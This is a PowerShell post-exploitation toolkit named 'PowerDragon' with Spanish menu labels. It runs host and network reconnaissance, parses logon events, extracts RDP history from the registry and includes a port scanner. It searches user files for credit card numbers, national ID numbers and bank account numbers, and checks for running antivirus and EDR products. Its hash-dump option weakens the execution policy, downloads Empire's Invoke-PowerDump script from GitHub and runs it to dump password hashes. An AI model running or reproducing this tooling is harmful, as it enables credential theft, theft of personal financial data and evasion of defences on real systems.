﻿

#FUNCION GET-COMPUTERDETAILS

function Get-SystemInfo{
    Write-Host "OBTENIENDO INFORMACION DEL SISTEMA" -fore green
    systeminfo
    Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
}

function Get-SystemNetwotkConfiguraton{
    Write-Host "OBTENIENDO INFORMACION DE LA CONFIGURACIÓN DE RED" -fore green
    ipconfig /all
    netsh interface show interface
    arp -a
    nbtstat -n
    net config
    net view /domain
    net view
}

function Get-ListFirewallRules{
     Write-Host "IDENTIFICANDO REGLAS DEL FIREWALL" -fore green
    netsh advfirewall firewall show rule name=all
}

function Find-4648Logons
{
    
    Param(
        $SecurityLog
    )

    $ExplicitLogons = $SecurityLog | Where {$_.InstanceID -eq 4648}
    $ReturnInfo = @{}

    foreach ($ExplicitLogon in $ExplicitLogons)
    {
        $Subject = $false
        $AccountWhosCredsUsed = $false
        $TargetServer = $false
        $SourceAccountName = ""
        $SourceAccountDomain = ""
        $TargetAccountName = ""
        $TargetAccountDomain = ""
        $TargetServer = ""
        foreach ($line in $ExplicitLogon.Message -split "\r\n")
        {
            if ($line -cmatch "^Subject:$")
            {
                $Subject = $true
            }
            elseif ($line -cmatch "^Account\sWhose\sCredentials\sWere\sUsed:$")
            {
                $Subject = $false
                $AccountWhosCredsUsed = $true
            }
            elseif ($line -cmatch "^Target\sServer:")
            {
                $AccountWhosCredsUsed = $false
                $TargetServer = $true
            }
            elseif ($Subject -eq $true)
            {
                if ($line -cmatch "\s+Account\sName:\s+(\S.*)")
                {
                    $SourceAccountName = $Matches[1]
                }
                elseif ($line -cmatch "\s+Account\sDomain:\s+(\S.*)")
                {
                    $SourceAccountDomain = $Matches[1]
                }
            }
            elseif ($AccountWhosCredsUsed -eq $true)
            {
                if ($line -cmatch "\s+Account\sName:\s+(\S.*)")
                {
                    $TargetAccountName = $Matches[1]
                }
                elseif ($line -cmatch "\s+Account\sDomain:\s+(\S.*)")
                {
                    $TargetAccountDomain = $Matches[1]
                }
            }
            elseif ($TargetServer -eq $true)
            {
                if ($line -cmatch "\s+Target\sServer\sName:\s+(\S.*)")
                {
                    $TargetServer = $Matches[1]
                }
            }
        }

        if (-not ($TargetAccountName -cmatch "^DWM-.*" -and $TargetAccountDomain -cmatch "^Window\sManager$"))
        {
            $Key = $SourceAccountName + $SourceAccountDomain + $TargetAccountName + $TargetAccountDomain + $TargetServer
            if (-not $ReturnInfo.ContainsKey($Key))
            {
                $Properties = @{
                    LogType = 4648
                    LogSource = "Security"
                    SourceAccountName = $SourceAccountName
                    SourceDomainName = $SourceAccountDomain
                    TargetAccountName = $TargetAccountName
                    TargetDomainName = $TargetAccountDomain
                    TargetServer = $TargetServer
                    Count = 1
                    Times = @($ExplicitLogon.TimeGenerated)
                }

                $ResultObj = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $ResultObj)
            }
            else
            {
                $ReturnInfo[$Key].Count++
                $ReturnInfo[$Key].Times += ,$ExplicitLogon.TimeGenerated
            }
        }
    }
    Write-Host $ReturnInfo

    return $ReturnInfo
}

function Find-4624Logons
{

    Param (
        $SecurityLog
    )

    $Logons = $SecurityLog | Where {$_.InstanceID -eq 4624}
    $ReturnInfo = @{}

    foreach ($Logon in $Logons)
    {
        $SubjectSection = $false
        $NewLogonSection = $false
        $NetworkInformationSection = $false
        $AccountName = ""
        $AccountDomain = ""
        $LogonType = ""
        $NewLogonAccountName = ""
        $NewLogonAccountDomain = ""
        $WorkstationName = ""
        $SourceNetworkAddress = ""
        $SourcePort = ""

        foreach ($line in $Logon.Message -Split "\r\n")
        {
            if ($line -cmatch "^Subject:$")
            {
                $SubjectSection = $true
            }
            elseif ($line -cmatch "^Logon\sType:\s+(\S.*)")
            {
                $LogonType = $Matches[1]
            }
            elseif ($line -cmatch "^New\sLogon:$")
            {
                $SubjectSection = $false
                $NewLogonSection = $true
            }
            elseif ($line -cmatch "^Network\sInformation:$")
            {
                $NewLogonSection = $false
                $NetworkInformationSection = $true
            }
            elseif ($SubjectSection)
            {
                if ($line -cmatch "^\s+Account\sName:\s+(\S.*)")
                {
                    $AccountName = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Account\sDomain:\s+(\S.*)")
                {
                    $AccountDomain = $Matches[1]
                }
            }
            elseif ($NewLogonSection)
            {
                if ($line -cmatch "^\s+Account\sName:\s+(\S.*)")
                {
                    $NewLogonAccountName = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Account\sDomain:\s+(\S.*)")
                {
                    $NewLogonAccountDomain = $Matches[1]
                }
            }
            elseif ($NetworkInformationSection)
            {
                if ($line -cmatch "^\s+Workstation\sName:\s+(\S.*)")
                {
                    $WorkstationName = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Source\sNetwork\sAddress:\s+(\S.*)")
                {
                    $SourceNetworkAddress = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Source\sPort:\s+(\S.*)")
                {
                    $SourcePort = $Matches[1]
                }
            }
        }
        if (-not ($NewLogonAccountDomain -cmatch "NT\sAUTHORITY" -or $NewLogonAccountDomain -cmatch "Window\sManager"))
        {
            $Key = $AccountName + $AccountDomain + $NewLogonAccountName + $NewLogonAccountDomain + $LogonType + $WorkstationName + $SourceNetworkAddress + $SourcePort
            if (-not $ReturnInfo.ContainsKey($Key))
            {
                $Properties = @{
                    LogType = 4624
                    LogSource = "Security"
                    SourceAccountName = $AccountName
                    SourceDomainName = $AccountDomain
                    NewLogonAccountName = $NewLogonAccountName
                    NewLogonAccountDomain = $NewLogonAccountDomain
                    LogonType = $LogonType
                    WorkstationName = $WorkstationName
                    SourceNetworkAddress = $SourceNetworkAddress
                    SourcePort = $SourcePort
                    Count = 1
                    Times = @($Logon.TimeGenerated)
                }

                $ResultObj = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $ResultObj)
            }
            else
            {
                $ReturnInfo[$Key].Count++
                $ReturnInfo[$Key].Times += ,$Logon.TimeGenerated
            }
        }
    }

    return $ReturnInfo
}


Function Find-RDPClientConnections
{

    $ReturnInfo = @{}

    New-PSDrive -Name HKU -PSProvider Registry -Root Registry::HKEY_USERS | Out-Null

    $Users = Get-ChildItem -Path "HKU:\"
    foreach ($UserSid in $Users.PSChildName)
    {
        $Servers = Get-ChildItem "HKU:\$($UserSid)\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue

        foreach ($Server in $Servers)
        {
            $Server = $Server.PSChildName
            $UsernameHint = (Get-ItemProperty -Path "HKU:\$($UserSid)\Software\Microsoft\Terminal Server Client\Servers\$($Server)").UsernameHint
                
            $Key = $UserSid + "::::" + $Server + "::::" + $UsernameHint

            if (!$ReturnInfo.ContainsKey($Key))
            {
                $SIDObj = New-Object System.Security.Principal.SecurityIdentifier($UserSid)
                $User = ($SIDObj.Translate([System.Security.Principal.NTAccount])).Value

                $Properties = @{
                    CurrentUser = $User
                    Server = $Server
                    UsernameHint = $UsernameHint
                }

                $Item = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $Item)
            }
        }
    }

    return $ReturnInfo

}


#FUNCION INVOKE-PORTSCAN
function Invoke-PortScan {

        [CmdletBinding()] Param(
            [parameter(Mandatory = $true, Position = 0)]
            [ValidatePattern("\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")]
            [string]
            $StartAddress,

            [parameter(Mandatory = $true, Position = 1)]
            [ValidatePattern("\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")]
            [string]
            $EndAddress,
        
            [switch]
            $ResolveHost,

            [switch]
            $ScanPort,

            [int[]]
            $Ports = @(21,22,23,53,69,71,80,98,110,139,111,389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901),
        
            [int]
            $TimeOut = 100
    )  
    Begin {
    $ping = New-Object System.Net.Networkinformation.Ping
    }
    Process {
    foreach($a in ($StartAddress.Split(".")[0]..$EndAddress.Split(".")[0])) {
        foreach($b in ($StartAddress.Split(".")[1]..$EndAddress.Split(".")[1])) {
        foreach($c in ($StartAddress.Split(".")[2]..$EndAddress.Split(".")[2])) {
            foreach($d in ($StartAddress.Split(".")[3]..$EndAddress.Split(".")[3])) {
            write-progress -activity PingSweep -status "$a.$b.$c.$d" -percentcomplete (($d/($EndAddress.Split(".")[3])) * 100)
            $pingStatus = $ping.Send("$a.$b.$c.$d",$TimeOut)
            if($pingStatus.Status -eq "Success") {
                if($ResolveHost) {
                write-progress -activity ResolveHost -status "$a.$b.$c.$d" -percentcomplete (($d/($EndAddress.Split(".")[3])) * 100) -Id 1
                $getHostEntry = [Net.DNS]::BeginGetHostEntry($pingStatus.Address, $null, $null)
                }
                if($ScanPort) {
                $openPorts = @()
                for($i = 1; $i -le $ports.Count;$i++) {
                    $port = $Ports[($i-1)]
                    write-progress -activity PortScan -status "$a.$b.$c.$d" -percentcomplete (($i/($Ports.Count)) * 100) -Id 2
                    $client = New-Object System.Net.Sockets.TcpClient
                    $beginConnect = $client.BeginConnect($pingStatus.Address,$port,$null,$null)
                    if($client.Connected) {
                    $openPorts += $port
                    } else {
                    # Wait
                    Start-Sleep -Milli $TimeOut
                    if($client.Connected) {
                        $openPorts += $port
                    }
                    }
                    $client.Close()
                }
                }
                if($ResolveHost) {
                $hostName = ([Net.DNS]::EndGetHostEntry([IAsyncResult]$getHostEntry)).HostName
                }
                # Return Object
                New-Object PSObject -Property @{
                IPAddress = "$a.$b.$c.$d";
                HostName = $hostName;
                Ports = $openPorts
                } | Select-Object IPAddress, HostName, Ports
            }
            }
        }
        }
    }
    }
    End {
    }
}


#FUNCION GET-ACCESFOLDERS

function Get-AccesFolders{
    Write-Host "IDENTIFICANDO LOS PERMISOS DE LAS CARPETAS" -fore green
    $Content
    $folders='C:\Users\javier\'

    $results ='C:\Users\javier\Desktop\results.txt'
    foreach($folder in $folders){
    Write-Output $folder
    $files = Get-ChildItem -LiteralPath  $folder -Recurse |Get-Acl|Select-Object Path -ExpandProperty Access|Format-List|Out-File -Append -FilePath $results -Force
    Write-Output $files
    }
}


#FUNCION GET-REGEXCOINCIDENTS
function Get-RegexCoincidents{
    Write-Host "oBTEIENOD COINCIDENCIAS" -fore green
    $folders= "C:\Users\javier\"
    $resultado="C:\Users\javier\Desktop\resultsRegex.txt"
    
    
    $regexIP="\b(?:25[0-5]|2[0-5][0-9]|1[0-9]{2}|[1-9][0-9]|[1-9])\.(?:(?:25[0-5]|2[0-5][0-9]|1[0-9]{2}|[0-9]{1,2})\.){2}(?:25[0-5]|2[0-5][0-9]|1[0-9]{2}|[0-9]{1,2})(?:\/[0-9]{1,2})?\b"
    $regexInternalIP="\b(10\.[0-9]{1,3}|172\.((1[6-9])|(2[0-9])|(3[0-1]))|192\.168)(\.[0-9]{1,3}){2}\b"
    $regexEmail="\b(?:[a-z0-9!#$%&'*+\/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+\/=?^_`{|}~-]+)*|""(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*"")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9]))\.){3}(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9])|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])"
    $regexDNI="\b(([x-z]|[X-Z]{1})([-]?)(\d{7})([-]?)([a-z]|[A-Z]{1}))|((\d{8})([-]?)([a-z]|[A-Z]{1}))\b"
    $regexVISA="\b4(?:\d[ -]*?){15}\b"
    $regexMASTERCARD="\b(?:5[1-5][0-9]{4}|2(?:2[2-9][1-9][0-9]{2}|[3-6][0-9]{4}|7(?:[0-1][0-9]{3}|20[0-9]{2})))[0-9]{10}\b"
    $regexAmericanExpress="3[47][0-9]{13}"
    $regexING="(ES\d{2})?([\s]|-)?1465([\s]|-)?\d{4}([\s]|-)?\d{2}([\s]|-)?\d{10}"
    $regexUser="(\\ad\\)?[a-zA-Z]{2}\d{2}[a-zA-Z]{2}(LSA)?"

    $arrayExtensiones= "*.pdf","*.txt"

    $var="hola"
    $array=  $regexIP, $regexInternalIP, $regexEmail, $regexDNI, $regexVISA, $regexMASTERCARD, $regexAmericanExpress , $regexING, $regexUser
  

    $resu

    function MultiSelect-String($items, $array){
        foreach($item in $items){
            Write-Host "hola"
            $resu1=Select-String -LiteralPath $item -Pattern $array -AllMatches|Select-Object Path, Pattern, LineNumber, Line|Format-Table -HideTableHeaders
            $resu+=$resu1     
            Write-Host $item
        }
      return $resu
    }


    Write-Output $array
    foreach($folder in $folders){
        $items=Get-ChildItem -LiteralPath ($folder+"\") -File -Recurse | where Length -le 500kb  | % {$_.FullName}
        $resultadoFinal=MultiSelect-String $items $array  
        $resultadoFinal|Out-File -Append -width 1000000 -FilePath $resultado -Force
        
    }


}

function Get-SystemTaskDiscobery{
    Write-Host "OBTENIENDO LAS TAREAS DEL EQUIPO" -fore green
    tasklist.exe
}


Function Get-SecuritySoftwareCMD{
    Write-Host "IDENTIFICANDO POSIBLES SECURITY SOFTWARE" -fore green
    netsh.exe advfirewall  show allprofiles
    tasklist.exe | findstr /i virus
    tasklist.exe | findstr /i cb
    tasklist.exe | findstr /i defender
    tasklist.exe | findstr /i cylance
}

function Get-SecuritySoftwarePS{
    Write-Host "IDENTIFICANDO POSIBLES SECURITY SOFTWARE" -fore green
    get-process | ?{$_.Description -like "*virus*"}
    get-process | ?{$_.Description -like "*carbonblack*"}
    get-process | ?{$_.Description -like "*defender*"}
    get-process | ?{$_.Description -like "*cylance*"}
}


function Get-HashDump{
    [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
    Write-Host "INICIANDO EL DUMPEO DE HASHES" -fore green
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
    Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile ".\PowerDump.ps1"
    Import-Module .\PowerDump.ps1
    Invoke-PowerDump
}


function Show-Menu {
    param (
        [string]$Title = 'PowerDragon'
    )
    Clear-Host
    Write-Host "================ $Title ================"
    
    Write-Host "1: Get-SystemInfo."
    Write-Host "2: Get-SystemNetwotkConfiguraton"
    Write-Host "3: Get-ScanPort."
    Write-Host "4: Get-ListFirewallRules"
    Write-Host "5: Find-4648Logons"
    Write-Host "6: Find-4624Logons"
    Write-Host "7: Find-RDPClientConnections"
    Write-Host "8: Get-AccesFolders"
    Write-Host "9: Get-RegexCoincidents"
    Write-Host "10: Get-SystemTaskDiscobery"
    Write-Host "11: Get-SecuritySoftwareCMD"
    Write-Host "12: Get-SecuritySoftwarePS"
    Write-Host "13: Get-HashDump"
    Write-Host "q: salir"
}

do
{
     Show-Menu
     $input = Read-Host "Seleecciona una opcion:"
     switch ($input)
     {
           '1' {
                Get-SystemInfo
           } '2' {
                Get-SystemNetwotkConfiguraton
           } '3' {
                Invoke-PortScan
           } 
            '4' {
                Get-ListFirewallRules
           }
            '5' {
                Find-4648Logons
           }
            '6' {
                Find-4624Logons
           }
            '7' {
                Find-RDPClientConnections
           }
            '8' {
               Get-AccesFolders
           }
            
            '9' {
                Get-RegexCoincidents
           }
            '10' {
               Get-SystemTaskDiscobery
           }
            '11' {
                Get-SecuritySoftwareCMD
           }
            '12' {
               Get-SecuritySoftwarePS
           }
           '13' {
               Get-HashDump
           }'q' {
                return
           }
     }
     pause
}
until ($input -eq 'q')